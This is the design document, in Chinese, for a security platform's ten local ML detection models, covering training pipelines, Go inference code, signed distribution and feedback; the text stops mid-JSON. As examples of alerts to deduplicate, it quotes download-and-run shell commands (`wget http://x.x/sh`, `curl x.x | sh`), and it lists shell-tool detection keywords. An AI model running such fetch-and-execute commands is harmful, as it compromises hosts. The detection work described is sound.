# 本地 ML 模型清单与训推管线

> **范围**：mxsec 平台内置的全部本地机器学习模型，配套的训练管线、推理栈、模型分发、签名管理、反馈闭环与用户可见的配置门控。
>
> **上位文档**：[`architecture.md`](architecture.md) §10 智能分析、[`operating-modes.md`](operating-modes.md)、[`multi-tenant.md`](multi-tenant.md)、[`llmproxy-design.md`](llmproxy-design.md)。
>
> **核心定位**：本地 ML 不是"算法堆料"，而是**工业级开源 CWPP 在离网政企/金融/信创环境下唯一可交付的智能检测路径**。LLM 是可选语义增强，本地 ML 是默认推荐能力。

---

## 1. ML 哲学

mxsec 的本地 ML 设计遵循 6 条硬约束。违反任一条即被判定为"不可商用的实验代码"，不进 release。

| 约束 | 原因 |
|------|------|
| **本地优先（On-Prem First）** | ToB 政企/金融客户 80%+ 部署在离网或半离网环境，禁止任何"必须连外网才能推理"的设计。模型文件本地存储，推理本地完成。 |
| **CPU 推理（No GPU）** | 主机 Agent 与 Engine 节点均以 CPU 为主，GPU 仅做训练。所有模型必须在普通 x86 服务器（8C/16G）跑出可商用延迟。 |
| **训推分离** | 训练放在内部 Lab 集群（MLflow + Airflow + 可选 GPU），生产环境只跑 ONNX Runtime CPU 推理，不暴露 PyTorch/sklearn 依赖。 |
| **用户可选关闭** | 三档开关：纯规则 / +本地 ML / +LLM API。任一档位运行，平台核心功能不退化（仅 ML 增强类告警不触发）。 |
| **模型可解释** | 每条 ML 告警必须能反查特征贡献（IForest 路径深度、LightGBM SHAP top5、Embedding 相似句），不允许"黑箱告警"。 |
| **磨合优先（Observe-First）** | 所有 ML 模型默认 `mode=observe` 出告警不下处置，磨合达标后再随租户切 `protect`，详见 [`operating-modes.md`](operating-modes.md) §3。 |

> mxsec 不做"通用 AI 安全大模型"，不做"GPU 实时推理"，不做"端侧深度学习"。所有 ML 都是"小而精、可解释、可禁用"的工业组件。

---

## 2. 推理栈

### 2.1 运行时

| 项 | 选型 | 理由 |
|----|------|------|
| 推理引擎 | **ONNX Runtime 1.18+ CPU EP** | 跨语言 ABI 稳定、CPU 性能强、原生支持 ONNX 与 ONNX-ML 算子 |
| Go 绑定 | **github.com/yalue/onnxruntime_go** v1.x | 纯 Go cgo 包装，编译期可控，离线打包友好 |
| 张量处理 | **gonum + 自维护 utils/featurize** | 数值稳定，避免 import numpy 类重型依赖 |
| 字符特征 | **golang.org/x/text + 自维护 n-gram util** | 多语言 tokenizer 与 hashing trick |
| 词向量缓存 | **Redis `mxsec:ml:embedding:{hash}` 24h** | Embedding 推理 4-8ms，命中缓存 < 0.2ms |
| 模型签名 | **Ed25519 + internal/common/signing** | 与 Agent 升级签名机制复用 |
| 模型分发 | **mxsec component 系统** | 像病毒库一样下发，详见 §6 |

### 2.2 Engine 侧推理链路

```
Kafka mxsec.agent.* / mxsec.engine.alert
   │
   ▼
internal/server/engine/ml/runtime.go
   ├── modelRegistry  (启动加载 N 个 *.onnx + manifest.json)
   ├── featurizer     (per-model 特征抽取器, Go 实现, 无 Python 依赖)
   ├── inferencer     (onnxruntime_go.Session.Run, worker pool)
   ├── thresholdGate  (per-tenant 阈值, 来自 Redis 配置)
   ├── feedbackHook   (低置信样本入 mxsec.engine.feedback Topic)
   └── alertEmitter   (产 mxsec.engine.alert, 带 ml_score + feature_attr)
```

### 2.3 Agent 侧推理（仅 2 类模型）

仅 **ELF 二进制分类（LightGBM）** 与 **进程父子链 Markov** 在 Agent 端推理，其余模型一律 Engine 推理：

- 原因：Agent CPU 预算 < 3%、RSS < 80MB，承载不起 MiniLM/SecurityBERT 等 20MB+ 模型；
- ONNX Runtime Go binding 在 Agent 启动期 lazy load，二进制扫描事件触发推理；
- 模型分发走 Agent component channel，签名校验后落盘 `/var/lib/mxsec/models/`。

### 2.4 性能预算

| 推理点 | 延迟目标 | 内存 | 并发模型 |
|--------|----------|------|----------|
| Engine 单次 IForest 推理 | < 5ms P99 | < 50MB | 100 并发 worker |
| Engine MiniLM Embedding（22MB） | < 8ms P99 | < 80MB | 32 并发 worker |
| Engine LightGBM ELF 推理 | < 3ms P99 | < 30MB | 100 并发 worker |
| Engine XGBoost 网络入侵 | < 4ms P99 | < 40MB | 64 并发 worker |
| Agent LightGBM ELF（轻量裁剪） | < 10ms P99 | < 25MB（含 onnxruntime） | 4 并发 worker |
| Agent Markov 推理（纯 Go） | < 1ms P99 | < 5MB | 8 并发 worker |

---

## 3. 训练栈

### 3.1 训练框架

| 任务 | 训练框架 | 导出 |
|------|----------|------|
| 树模型（LightGBM / XGBoost） | `lightgbm` / `xgboost` Python + `onnxmltools` | ONNX opset 17 |
| 异常检测（IForest / OCSVM） | `scikit-learn` + `skl2onnx` | ONNX opset 17 |
| 浅层 NN（MLP） | `torch` 2.x | `torch.onnx.export(opset=17)` |
| Embedding（MiniLM / SecurityBERT） | `transformers` + `onnxruntime` 工具链 | 直接拉 HuggingFace ONNX 仓库或 `optimum-cli export onnx` |
| 聚类 / PCA | `scikit-learn` + `skl2onnx` | ONNX opset 17 |
| 序列模型（Markov） | 纯 Go 训练 | 直接序列化为 protobuf 状态表 |

### 3.2 训练基础设施

```
                ┌─────────────────────────────────┐
                │  内部 Lab Cluster (隔离环境)     │
                │                                 │
                │   MLflow Tracking + Registry    │
                │   ├── experiments/              │
                │   ├── runs/                     │
                │   └── models/                   │
                │                                 │
                │   Airflow DAG (每日 / 每周)     │
                │   ├── ingest_feedback           │
                │   ├── build_features            │
                │   ├── train_<model>             │
                │   ├── evaluate                  │
                │   ├── export_onnx               │
                │   ├── sign_artifact (Ed25519)   │
                │   └── publish_component         │
                │                                 │
                │   GPU 训练（可选, A10/A100 x 4）│
                │   CPU 训练（默认, 64C/128G）    │
                └────────────┬────────────────────┘
                             │ 签名 ONNX + manifest.json
                             ▼
            ┌────────────────────────────────────┐
            │ mxsec component registry           │
            │  ── 与病毒库 / 规则库共用分发通道  │
            └────────────────────────────────────┘
```

### 3.3 训练数据来源

- **公开数据集**：CICIDS-2017/2018、UNSW-NB15、DGArchive（DGA 域名）、MalwareBazaar（PE/ELF 二进制）、VirusShare（订阅）；
- **mxsec 反馈通道**：`mxsec.engine.feedback` Topic（用户标记 TP/FP/Uncertain）；
- **合成数据**：基于 Atomic Red Team 用例 + Sigma 规则注入器生成；
- **租户专属**：KA 客户授权数据脱敏后入"客户专属增量集"（独立 MLflow experiment，不混入通用模型）。

### 3.4 实验治理

- 每个模型一个 MLflow experiment；
- 每次训练产 `run_id`、记录数据版本、超参、评估指标、ONNX 文件、签名 hash；
- 评估必须包含 **precision / recall / F1 / AUC / FPR / 推理延迟 / 模型大小**；
- 不通过准入阈值（见 §4 每个模型的指标行）的 run 自动标记 `failed`，不进入下发候选。

---

## 4. 十个 P0/P1 本地 ML 模型

### 4.1 模型总览

| # | 模型 | 优先级 | 算法 | 训练框架 | 部署位置 | 模型大小 | CPU 延迟 | 状态 |
|---|------|--------|------|---------|---------|---------|---------|------|
| 1 | 主机行为基线 IForest | P0 | Isolation Forest | sklearn | Engine | 1.2 MB | 5 ms | 已有 v1 改造 |
| 2 | 进程父子链 Markov | P0 | 一阶 Markov | 纯 Go | Agent + Engine | 200 KB | < 1 ms | 新增 |
| 3 | syscall n-gram + Bloom | P0 | n-gram + Bloom Filter | 纯 Go | Engine | 4 MB | < 2 ms | 新增 |
| 4 | LightGBM ELF 二进制分类 | P0 | GBDT | LightGBM | Agent + Engine | 600 KB | 3 ms | 新增 |
| 5 | LightGBM DGA 域名 | P0 | GBDT | LightGBM | Engine | 400 KB | 2 ms | 新增 |
| 6 | per-image 容器异常 IForest | P1 | Isolation Forest | sklearn | Engine | 0.8 MB / image | 5 ms | 新增 |
| 7 | XGBoost 网络入侵 | P1 | GBDT | XGBoost | Engine | 1.5 MB | 4 ms | 新增 |
| 8 | MiniLM 告警去重 Embedding | P1 | Transformer Embedding | HuggingFace | Engine | 22 MB | 8 ms | 新增 |
| 9 | SecurityBERT 命令行异常 | P1 | Transformer Embedding | HuggingFace | Engine | 110 MB | 12 ms | 新增 |
| 10 | K-means + PCA UEBA | P1 | K-means + PCA | sklearn | Engine | 500 KB | 2 ms | 新增 |

### 4.2 模型 1 — 主机行为基线 IForest

**目的**：单台主机每日"画像"是否偏离自身历史基线，覆盖 BDE 13 维行为指标（进程 / 文件 / 网络 / DNS 四类）。

**数据集**：

- mxsec.agent.ebpf + mxsec.agent.events，按 `(tenant_id, host_id, day)` 聚合 13 维快照；
- 每个租户每主机持续监听 ≥ 14 天才进入训练样本池；
- 用户标记的 TP/FP 样本（来自 `mxsec.engine.feedback`）作为权重调整源。

**特征（13 维）**：

```text
process: exec_count, unique_exe, fork_rate
file:    write_count, unique_path, sensitive_hits
network: connect_count, unique_ip, unique_port, external_ratio
dns:     query_count, unique_domain, nx_ratio
```

**训练命令**：

```bash
# Lab 集群 Airflow Task
python -m mxsec.ml.train.iforest_host \
    --data s3://mxsec-ml/bde-snapshots/v3/ \
    --trees 100 --subsample 256 \
    --contamination 0.02 \
    --out artifacts/iforest_host_v3.onnx \
    --mlflow-run-name iforest_host_$(date +%Y%m%d)
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| AUC | ≥ 0.90 |
| precision @ score>0.6 | ≥ 0.85 |
| FPR | ≤ 0.02 |
| 推理延迟 P99 | ≤ 5ms |
| 模型大小 | ≤ 2MB |

**推理代码示例**：

```go
// internal/server/engine/ml/models/iforest_host.go
package models

import (
    ort "github.com/yalue/onnxruntime_go"
)

type IForestHost struct {
    session *ort.AdvancedSession
    input   *ort.Tensor[float32]
    output  *ort.Tensor[float32]
}

func (m *IForestHost) Score(features [13]float32) (float64, error) {
    copy(m.input.GetData(), features[:])
    if err := m.session.Run(); err != nil {
        return 0, err
    }
    return float64(m.output.GetData()[0]), nil
}
```

**复用现有实现**：`internal/server/consumer/anomaly/iforest.go` 纯 Go IForest 仍保留作为 fallback（离 ONNX 运行时不可用时启用），生产链路走 ONNX 版本（精度更稳、与 Python 训练管线一致）。

---

### 4.3 模型 2 — 进程父子链 Markov

**目的**：检测"进程父子链"异常模式（如 `nginx → bash → wget → /tmp/xx.elf`），覆盖反弹 shell、Web RCE、容器逃逸的执行链特征。

**数据集**：

- 干净基线：Linux 标准发行版 + 主流业务运行时（Nginx/Tomcat/MySQL/Redis）的 process_exec 链；
- 攻击样本：Atomic Red Team T1059 / T1071 / T1611 用例，约 5000 条父子链；
- 客户基线（可选）：每租户独立 Markov 状态表（KA 客户专属）。

**算法**：

- 一阶 Markov：`P(child_comm | parent_comm)`；
- 状态表大小：≤ 20000 父子 comm 对，超出走 hashing trick；
- 推理时若 `log P(child|parent) < -8` 触发告警，否则记 trace。

**训练命令（纯 Go，无 Python 依赖）**：

```bash
# 离线工具，输入历史 process_exec 事件
go run ./cmd/tools/ml-train markov \
    --input s3://mxsec-ml/process-exec/v2/*.parquet \
    --laplace 1.0 \
    --output artifacts/markov_v2.pb
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| recall（已知攻击链） | ≥ 0.85 |
| FPR（生产链 1d 抽样） | ≤ 0.005 |
| 状态表大小 | ≤ 20000 项 |
| 推理延迟 P99 | ≤ 1ms |

**推理代码示例**：

```go
// internal/server/engine/ml/models/markov.go
type MarkovChain struct {
    // log P(child | parent), 拉普拉斯平滑
    transitions map[uint64]float32
    threshold   float32 // 默认 -8.0
}

func (m *MarkovChain) Score(parentComm, childComm string) float32 {
    key := hash64(parentComm, childComm)
    if v, ok := m.transitions[key]; ok {
        return v
    }
    return -10.0 // 未见过的父子对直接低分
}
```

**部署位置**：Agent 端（内嵌于 EDR），Engine 端做兜底（覆盖 Agent 漏报）。

---

### 4.4 模型 3 — syscall 序列 n-gram + Bloom Filter

**目的**：检测进程的 syscall 调用序列异常，覆盖 shellcode / ROP / 提权链。

**数据集**：

- 正常进程 syscall trace（eBPF tracepoint：sys_enter_*）；
- 攻击样本：MSF payload、Cobalt Strike beacon 的 syscall trace、Atomic Red Team T1055。

**算法**：

- n=4 滑窗，sysno 序列拼接做哈希；
- 全局 Bloom Filter（5MB）存"已知正常"4-gram 集合；
- 推理：未命中比例 > 30% 视为异常。

**训练命令**：

```bash
go run ./cmd/tools/ml-train syscall-ngram \
    --input s3://mxsec-ml/syscall-trace/v1/ \
    --n 4 --bloom-size 5MB --fp-rate 0.001 \
    --output artifacts/syscall_bloom_v1.pb
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| Bloom FP rate | ≤ 0.001 |
| recall（shellcode 样本） | ≥ 0.80 |
| 模型大小 | ≤ 5MB |
| 推理延迟 P99 | ≤ 2ms |

**推理代码示例**：

```go
// internal/server/engine/ml/models/syscall_bloom.go
type SyscallBloom struct {
    bloom    *bloomfilter // 4-gram known-good
    windowN  int          // 默认 4
    threshAnomalyRatio float64 // 默认 0.30
}

func (s *SyscallBloom) Score(syscalls []int) float64 {
    if len(syscalls) < s.windowN {
        return 0
    }
    miss := 0
    total := len(syscalls) - s.windowN + 1
    for i := 0; i <= len(syscalls)-s.windowN; i++ {
        if !s.bloom.Contains(ngramHash(syscalls[i:i+s.windowN])) {
            miss++
        }
    }
    return float64(miss) / float64(total)
}
```

---

### 4.5 模型 4 — LightGBM ELF 二进制分类

**目的**：判定文件系统中新出现的 ELF 二进制是否为恶意（matchine learning 替代纯 YARA 的盲扫）。

**数据集**：

- 正样本：MalwareBazaar（约 25 万 ELF 样本，含 Mirai / Gafgyt / XMRig / Tsunami / Trojan）；
- 负样本：Linux 主流发行版 `/usr/bin` 全量 + Debian/CentOS/Alpine package mirror 抽样（约 30 万）；
- 训练 / 验证 / 测试比例 8:1:1，按家族分层抽样防泄漏。

**特征（60 维）**：

```text
ELF header (8):
  ei_class, ei_data, e_type, e_machine, e_entry/file_size 比, sh_num, ph_num, dynamic_section_count

Sections (16):
  .text 熵, .data 熵, .rodata 熵, BSS 大小占比,
  .init / .fini / .plt / .got 是否存在, 节命名熵,
  导入函数总数, 导出函数总数, 动态符号数,
  动态库依赖数, RPATH/RUNPATH 存在, NX/PIE/Stack-Canary/Fortify 标志,
  ASLR 启用,

Strings (20):
  /tmp/ /dev/shm/ 出现次数, base64 字串数, IPv4 字串数,
  URL 字串数, sh / bash / wget / curl / chmod / nc / python 关键词数,
  GET/POST/User-Agent 字串数, .so 字串数, /proc/ /etc/passwd 字串数,
  网络 API 字串数, 加密 API 字串数, 反汇编 syscall 调用频次,
  Tor / I2P / mining pool 字串数, "Mozilla" UA 数, 总字串数, 平均字串长度,
  熵 > 7.5 段数, base64 解码后 ELF 头数,

Imports (8):
  fork / execve / socket / connect / dup2 / setuid / ptrace / mprotect 命中数

Misc (8):
  文件大小（log）, 段数, hash 是否 known-good, hash 是否 known-bad,
  签名信息缺失, 编译时间 0 异常, upx 加壳, debug section 全删
```

**训练命令**：

```bash
python -m mxsec.ml.train.lgbm_elf \
    --positives s3://mxsec-ml/malware-bazaar/elf/ \
    --negatives s3://mxsec-ml/cleanware-elf/ \
    --max-depth 6 --num-leaves 31 --num-trees 300 \
    --early-stopping 30 \
    --out artifacts/lgbm_elf_v2.onnx \
    --features-meta artifacts/lgbm_elf_v2.features.json
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| Precision | ≥ 0.95 |
| Recall | ≥ 0.85 |
| AUC | ≥ 0.98 |
| FPR | ≤ 0.005 |
| 推理延迟 P99 | ≤ 3ms |
| 模型大小 | ≤ 1MB |

**推理代码示例**：

```go
// internal/server/engine/ml/models/lgbm_elf.go
type LGBMElf struct {
    session  *ort.AdvancedSession
    extractor *ElfFeatureExtractor // 纯 Go 解析 ELF, 不依赖外部 binutils
    input    *ort.Tensor[float32]
    output   *ort.Tensor[float32]
}

func (m *LGBMElf) Classify(path string) (verdict string, score float64, err error) {
    features, err := m.extractor.Extract(path) // [60]float32
    if err != nil {
        return "", 0, err
    }
    copy(m.input.GetData(), features[:])
    if err := m.session.Run(); err != nil {
        return "", 0, err
    }
    score = float64(m.output.GetData()[0])
    switch {
    case score >= 0.85:
        verdict = "malicious"
    case score >= 0.5:
        verdict = "suspicious"
    default:
        verdict = "benign"
    }
    return
}
```

**部署位置**：Agent（轻量裁剪版，60 → 30 特征，模型 300 KB）+ Engine（完整版）。

---

### 4.6 模型 5 — LightGBM DGA 域名

**目的**：识别 DNS 查询中的 DGA（Domain Generation Algorithm）域名，覆盖 Conficker / Necurs / Ramnit / Tinba 等家族。

**数据集**：

- 正样本：DGArchive（含 90+ DGA 家族，约 200 万域名）；
- 负样本：Alexa Top 1M + Tranco Top 1M + 客户实际 DNS 域名脱敏样本。

**特征（28 维）**：

```text
基础 (6): 域名长度, 标签数, TLD 长度, 数字字符比, 元音比, 辅音连续最大长度
熵 (4):   字符 entropy, bigram entropy, label entropy, 拼音可读性评分
n-gram (10): 字符 2-gram / 3-gram top-N 命中率（基于英文词频字典）
词典命中 (4): 英文词典命中比, 拼音词典命中比, 公司名词典命中, 品牌词典命中
TLD (4):  TLD 知名度, TLD 风险度, 是否 .top/.xyz/.cn 等 DGA 偏好 TLD, 二级域名风险词命中
```

**训练命令**：

```bash
python -m mxsec.ml.train.lgbm_dga \
    --positives s3://mxsec-ml/dgarchive/v3/ \
    --negatives s3://mxsec-ml/alexa-tranco/ \
    --max-depth 5 --num-leaves 31 --num-trees 200 \
    --out artifacts/lgbm_dga_v3.onnx
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| Precision | ≥ 0.95 |
| Recall | ≥ 0.90 |
| FPR（Alexa top1M） | ≤ 0.002 |
| 推理延迟 P99 | ≤ 2ms |
| 模型大小 | ≤ 500KB |

---

### 4.7 模型 6 — per-image 容器异常 IForest

**目的**：解决"同 namespace 不同 Pod 漂移"问题——以 **镜像（image+tag）** 为维度建立行为基线，模型不随容器实例漂移。对标青藤蜂巢「容器异常学习」。

**数据集**：

- mxsec.agent.ebpf 事件按 `(image_digest, day)` 聚合 13 维快照；
- 每个 image 至少 7 天数据才训练，未达样本量的 image 走通用 IForest（模型 1）兜底；
- 客户专属镜像（私有 registry）走"租户内独立模型"，公共 image（dockerhub 官方）走"全租户共享模型"。

**特征**：与模型 1 相同的 13 维 BDE 快照（复用 featurizer）。

**训练命令**：

```bash
# Airflow 每周一次, 按 image 维度循环训练
python -m mxsec.ml.train.iforest_image \
    --image-digest sha256:xxxx \
    --window-days 14 \
    --trees 80 --subsample 128 \
    --contamination 0.02 \
    --out artifacts/iforest_image_<digest>.onnx
```

**模型管理**：

- 模型命名：`iforest_image_<digest_prefix>.onnx`；
- 同 image 多版本保留 3 个，自动淘汰最旧；
- Engine 启动加载常用 image 模型（Top 100），冷门 image 走 lazy load + LRU 缓存。

**评估指标**：与模型 1 相同。

---

### 4.8 模型 7 — XGBoost 网络入侵分类

**目的**：基于五元组流统计特征，检测端口扫描、DDoS、横向移动、隧道、Brute Force 等网络攻击。

**数据集**：

- CICIDS-2017 / CICIDS-2018（含 14 种攻击类型，约 280 万流量记录）；
- UNSW-NB15（含 9 种攻击类型，约 250 万记录）；
- 客户脱敏流量补充（KA 客户授权）。

**特征（80 维，对齐 CICFlowMeter）**：

```text
基本 (8):    flow_duration, total_fwd_pkts, total_bwd_pkts, total_fwd_bytes, total_bwd_bytes,
             fwd_pkt_len_max/min/mean
包长度 (12): bwd_pkt_len_max/min/mean/std, flow_bytes_per_s, flow_pkts_per_s,
             flow_iat_mean/std/min/max, fwd_iat_total, bwd_iat_total
IAT (10):    fwd_iat_mean/std/min/max, bwd_iat_mean/std/min/max, fwd_psh_flags, bwd_psh_flags
Flag (10):   fwd_urg, bwd_urg, fwd_header_len, bwd_header_len, fwd_pkts_per_s, bwd_pkts_per_s,
             pkt_len_min/max/mean/std
窗口 (10):   pkt_len_variance, fin_flag_count, syn_flag_count, rst_flag_count, psh_flag_count,
             ack_flag_count, urg_flag_count, cwe_flag_count, ece_flag_count, down_up_ratio
统计 (10):   avg_pkt_size, avg_fwd_seg_size, avg_bwd_seg_size, fwd_seg_size_avg,
             init_win_bytes_fwd, init_win_bytes_bwd, fwd_act_data_pkts, fwd_seg_size_min,
             active_mean/std
空闲 (10):   active_max/min, idle_mean/std/max/min, fwd_byts_b_avg, fwd_pkts_b_avg,
             fwd_blk_rate_avg, bwd_byts_b_avg
应用 (10):   bwd_pkts_b_avg, bwd_blk_rate_avg, subflow_fwd_pkts, subflow_fwd_bytes,
             subflow_bwd_pkts, subflow_bwd_bytes, sport, dport, proto, is_internal
```

**训练命令**：

```bash
python -m mxsec.ml.train.xgb_network \
    --datasets cicids-2017,cicids-2018,unsw-nb15 \
    --max-depth 7 --num-trees 400 --learning-rate 0.05 \
    --early-stopping 30 \
    --label-encoder artifacts/xgb_net_labels.json \
    --out artifacts/xgb_network_v2.onnx
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| Macro F1 | ≥ 0.90 |
| Benign recall | ≥ 0.98（误报敏感） |
| DDoS recall | ≥ 0.95 |
| Brute Force recall | ≥ 0.90 |
| 推理延迟 P99 | ≤ 4ms |
| 模型大小 | ≤ 2MB |

**Engine 输入源**：mxsec.agent.ebpf 的 tcp_connect / tcp_close 事件经 5s flow 聚合后特征化，落到推理。

---

### 4.9 模型 8 — MiniLM-L6-v2 告警去重 Embedding

**目的**：把不同主机 / 不同规则产出的"语义同义"告警归并，降低告警疲劳。例：`/bin/sh -c "wget http://x.x/sh"` 与 `bash -c "curl x.x | sh"` 应识别为同一类。

**模型来源**：HuggingFace `sentence-transformers/all-MiniLM-L6-v2`，384 维向量，已有官方 ONNX 仓库 `optimum/all-MiniLM-L6-v2`。

**特征输入**：告警结构化字段 `{rule_name, severity, key_fields}` 拼接成自然语言句子（go template）。

**去重算法**：

```text
1. 计算 embedding(s) -> 384 维向量
2. Redis vector cache (mxsec:ml:embedding:{sha256}) 24h
3. 与最近 30 分钟同租户告警的向量比对（cosine sim ≥ 0.92 视为同类）
4. 同类告警合并到 same alert group, count++
```

**部署**：Engine 侧推理，向量缓存 Redis（避免重复推理同句子）。

**评估指标**：

| 指标 | 阈值 |
|------|------|
| 同义对召回 | ≥ 0.85 |
| 异义对误并率 | ≤ 0.05 |
| 推理延迟 P99 | ≤ 8ms |
| 模型大小 | ≤ 25MB |

**导出命令**：

```bash
optimum-cli export onnx \
    --model sentence-transformers/all-MiniLM-L6-v2 \
    --optimize O3 \
    artifacts/minilm_l6_v2/
```

**推理代码示例**：

```go
// internal/server/engine/ml/models/minilm.go
type MiniLM struct {
    tokenizer *hftokenizer.Tokenizer // tokenizers.json 加载, 纯 Go
    session   *ort.AdvancedSession
}

func (m *MiniLM) Embed(text string) ([]float32, error) {
    ids, mask := m.tokenizer.Encode(text, 128)
    out := make([]float32, 384)
    if err := m.session.RunWithInputs(map[string]any{
        "input_ids":     ids,
        "attention_mask": mask,
    }, map[string]any{
        "sentence_embedding": out,
    }); err != nil {
        return nil, err
    }
    return out, nil
}
```

---

### 4.10 模型 9 — SecurityBERT Embedding 命令行异常

**目的**：识别可疑命令行（含 base64 编码、obfuscation、罕见组合），覆盖 reverse shell、内存马 loader、提权链。

**模型来源**：

- 优先使用 [`ehsanaerio/SecurityBERT`](https://huggingface.co/ehsanaerio/SecurityBERT)（Apache-2.0，安全语料微调 BERT）；
- 备选 `CIRCL/cybert-base`、`microsoft/codebert-base`。

**算法**：

1. 命令行 string → SecurityBERT embedding (768 维)；
2. 与"已知良性命令 cluster centroid"（K-means k=200，每周重训）比对；
3. min distance > 阈值 → 异常。

**评估指标**：

| 指标 | 阈值 |
|------|------|
| Reverse shell 召回 | ≥ 0.85 |
| FPR（生产命令样本） | ≤ 0.02 |
| 推理延迟 P99 | ≤ 12ms |
| 模型大小 | ≤ 120MB |

**部署位置**：Engine 端，命令行长度 ≤ 512 token，超长截断。资源敏感租户可在配置中禁用此模型。

---

### 4.11 模型 10 — K-means + PCA UEBA 登录基线

**目的**：用户登录行为异常检测（异地、异时、异常 IP、异常工作站）。对标青藤万相 4.3.2 "异常登录"。

**数据集**：

- mxsec.agent.events 登录事件（PAM session_open / sshd_audit）；
- 90 天滑窗，按 `(tenant_id, user_id)` 维度聚类。

**特征（10 维）**：

```text
src_ip_country_code (one-hot top10)
src_ip_asn (类别嵌入)
hour_of_day_sin / cos
day_of_week_sin / cos
auth_method (password / pubkey / mfa)
login_success_rate_7d
unique_src_ip_30d
session_duration_log
geo_distance_to_last_login_km
```

**算法**：

- PCA 降维 10 → 4；
- K-means k=6 学习"该用户的常态行为聚类"；
- 推理时计算当前行为到最近 cluster centroid 的欧氏距离，超过 95 分位阈值即告警。

**训练命令**：

```bash
python -m mxsec.ml.train.kmeans_ueba \
    --window-days 90 \
    --k 6 --pca-dim 4 \
    --out artifacts/kmeans_ueba_v1.onnx
```

**评估指标**：

| 指标 | 阈值 |
|------|------|
| 异地登录召回 | ≥ 0.90 |
| 工作时间外登录召回 | ≥ 0.80 |
| FPR | ≤ 0.03 |
| 推理延迟 P99 | ≤ 2ms |

---

## 5. 训练管线

### 5.1 Airflow DAG 结构

```text
mxsec_ml_train_<model_name> (Daily / Weekly)
   │
   ├── 1. ingest_feedback         (从 Kafka mxsec.engine.feedback 抽取 7d 反馈)
   ├── 2. build_features          (Spark / Python 特征工程, 入 S3 parquet)
   ├── 3. split_train_test        (按时间 + 家族分层)
   ├── 4. train_model             (sklearn/LightGBM/XGBoost/PyTorch)
   ├── 5. evaluate                (Precision/Recall/F1/AUC/FPR + 推理延迟)
   │       └── 不达标 → fail, 告警, 不发布
   ├── 6. export_onnx             (skl2onnx / onnxmltools / torch.onnx.export)
   ├── 7. quantize                (INT8 量化, 仅 Embedding 模型)
   ├── 8. sign_artifact           (Ed25519 私钥签名 .onnx + manifest)
   ├── 9. publish_component       (上传到 mxsec component registry)
   └── 10. notify_release_manager (Slack 通知, 等待灰度审批)
```

### 5.2 离线定时重训

| 模型 | 频率 | 触发条件 |
|------|------|----------|
| IForest 主机基线 | 每周 | 反馈量 > 1000 或 FPR 上涨 |
| Markov 父子链 | 每月 | 新业务运行时引入 |
| syscall Bloom | 每周 | 新攻击样本 ≥ 100 |
| LightGBM ELF | 每周 | MalwareBazaar 新样本 ≥ 5000 |
| LightGBM DGA | 每月 | DGArchive 新家族 ≥ 1 |
| per-image IForest | 每日（按需） | 该 image 新样本 ≥ 阈值 |
| XGBoost 网络 | 每月 | 客户反馈 FPR > 阈值 |
| MiniLM 去重 | 季度 | 仅在新版上游模型发布时升级 |
| SecurityBERT 命令行 | 每月 | 反馈量 + 新攻击库变化 |
| K-means UEBA | 每周 | 滚动窗口前移 |

### 5.3 灰度发布

每个新模型走 **5% → 25% → 100% 三阶段灰度**，与 [`operating-modes.md`](operating-modes.md) §5 切换流程一致：

```text
T0:    5% 租户启用新模型 24h
       └── 监控指标：alerts_per_host_per_day、fp_rate、推理 P99 延迟
       └── 任一指标比 baseline 恶化 30% → 自动回滚

T+1d:  25% 租户启用 24h（同上监控）

T+2d:  100% 租户启用

T+7d:  Release Notes 发布 + 老模型保留 14 天备份
```

---

## 6. 模型分发：复用 mxsec component 系统

ML 模型像病毒库一样下发——**不重新造轮子，复用 Agent component 与 Engine plugin 的分发通道**。

### 6.1 Artifact 结构

```text
mxsec-ml-iforest-host-v3.0.5.tar.gz
├── manifest.json       # name/version/sha256/signature/min_engine_version
├── model.onnx          # ONNX 文件
├── features.json       # 特征定义、归一化参数
├── thresholds.json     # 默认阈值（per-severity）
└── changelog.md        # 训练数据范围、指标、改动原因
```

**manifest.json**：

```json
{
  "name": "iforest-host",
  "version": "3.0.5",
  "model_type": "iforest",
  "deploy_target": "engine",
  "input_shape": [1, 13],
  "output_shape": [1, 1],
  "onnx_opset": 17,
  "sha256": "<hex>",
  "signature": "<ed25519 base64>",
  "signed_at": "2026-06-05T08:00:00Z",
  "trained_on_data_window": "2026-03-01..2026-05-31",
  "metrics": {
    "auc": 0.93,
    "precision_at_0.6": 0.87,
    "fpr": 0.015,
    "inference_p99_ms": 4.2
  },
  "min_engine_version": "2.0.0",
  "deprecates": ["iforest-host:3.0.4"],
  "rollback_to": "iforest-host:3.0.4"
}
```

### 6.2 分发流程

```text
Lab Cluster (Airflow + MLflow)
   │
   │ ① 训练 + 评估 + 签名
   ▼
mxsec-component-registry (S3 / MinIO + 元数据 MySQL)
   │
   │ ② Release Manager 审批 + 灰度配置
   ▼
Manager /api/v2/admin/ml/components POST
   │
   │ ③ 推送 mxsec.config.update Topic
   ▼
Engine instances (按 ConsumerGroup 收到通知)
   │ ④ 下载 → 验签 → 落盘 /var/lib/mxsec/models/
   │ ⑤ Reload 模型（zero-downtime, 双 buffer 切换）
   └── ⑥ 上报 ml_model_loaded 心跳
```

### 6.3 Agent 端模型分发

仅 LightGBM ELF + Markov 两个模型需要下发到 Agent：

- 走 Agent component channel（与病毒库、规则库同一通道）；
- Canary 灰度（Engine 触发，AgentCenter 执行）；
- 单模型 ≤ 1MB 大小约束，避免 Agent 升级窗口拉长。

### 6.4 版本管理与回滚

- 同一模型最多保留 3 个版本（new / current / fallback）；
- 任何告警指标恶化 → Manager UI 一键回滚到 fallback；
- 回滚命令：

  ```bash
  mxctl ml rollback iforest-host --to 3.0.4 --scope tenant:t-bank-a
  mxctl ml rollback iforest-host --to 3.0.4 --scope all
  ```

---

## 7. 反馈数据闭环

### 7.1 反馈 Topic

`mxsec.engine.feedback`（DataType 11900-11999）记录用户对每条告警的 TP / FP / Uncertain 标记，Engine 与训练管线均订阅：

```json
{
  "feedback_id": "fb-2026060500001",
  "alert_id": "alrt-2026060500001",
  "tenant_id": "t-bank-a",
  "rule_id": "ML_ANOMALY_PROCESS",
  "model_name": "iforest-host",
  "model_version": "3.0.5",
  "ml_score": 0.78,
  "ml_features": [...],
  "label": "false_positive",
  "user_comment": "业务正常 cron job",
  "labeled_by": "u-001",
